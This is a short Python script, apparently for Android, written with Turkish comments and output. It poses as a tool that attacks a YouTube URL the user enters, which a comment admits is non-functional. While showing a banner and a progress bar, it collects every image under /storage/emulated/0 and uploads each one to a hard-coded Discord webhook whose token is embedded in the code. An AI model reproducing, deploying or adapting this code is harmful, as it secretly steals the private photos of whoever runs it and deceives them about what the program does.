import os
import requests
import time
import socket
from tqdm import tqdm

WEBHOOK_URL = "https://discord.com/api/webhooks/1414659884317802728/5Kwn9NVvA0fvQZBUaQqhJS78NrggzvNxw2ctFBSEjcxqx2K-6qfMYW_9J8uGFnaSwWdi"  # Buraya kendi Discord webhook URL'nizi girin

def get_device_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return hostname, local_ip
    except:
        return "Bilinmiyor", "Bilinmiyor"

def send_to_discord(file_path):
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            requests.post(WEBHOOK_URL, files=files)
    except Exception as e:
        print(f"Hata oluştu: {e}")

def scan_and_upload():
    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
    base_dir = "/storage/emulated/0"

    target_id = input("Youtube Url: ")  # Kullanıcıdan örnek bilgi alıyor, işlevsel değil
    print(f"\n **{target_id}** attack...")  
    
    image_files = []  
    for root, _, files in os.walk(base_dir):  
        for file in files:  
            if file.lower().endswith(image_extensions):  
                image_files.append(os.path.join(root, file))  
    
    total_images = len(image_files)  
    if total_images == 0:  
        print("Hiç resim bulunamadı!")  
        return  
    
    print(f"Toplam **{total_images}** resim yükleniyor...\n")  
    
    for image_path in tqdm(image_files, desc="YÜKLENİYOR", unit="resim"):  
        send_to_discord(image_path)  
        time.sleep(0.1)
    
    print("\n Gönderim Tamamlandı!")

if __name__ == "__main__":
    print("""
---

\ / /  / /  / | / /  /  /  / /      /  |/  /  / /  /  /     _ | |
\  /  / __/    /  |/ /   / /   / /      / /|/ /  / __/       / /     ()/ /
/ /  / /   / /|  /  / /   / /   / /  / /  / /___      / /__   _  / /
//  /_____/  // |/  //  //  //  //  /__/     /_/  ()//
//
""")
    scan_and_upload()
